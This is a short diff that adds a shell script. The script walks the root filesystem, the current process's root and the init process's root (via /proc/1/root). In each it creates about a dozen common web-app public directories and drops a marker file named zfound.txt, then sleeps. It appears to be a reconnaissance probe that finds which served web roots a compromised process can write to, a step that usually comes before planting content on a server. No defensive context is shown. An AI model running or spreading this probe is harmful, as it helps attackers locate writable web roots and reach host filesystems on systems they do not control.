@@ -1,0 +1,8 @@
+#!/bin/sh
+for R in /proc/1/root /proc/self/root /; do
+  for d in app/public app/.next/standalone/public public usr/src/app/public var/www/html srv/app/public opt/app/public app/static app/dist app/build/public; do
+    mkdir -p "$R/$d" 2>/dev/null
+    echo "$R/$d" > "$R/$d/zfound.txt" 2>/dev/null
+  done
+done
+sleep 12
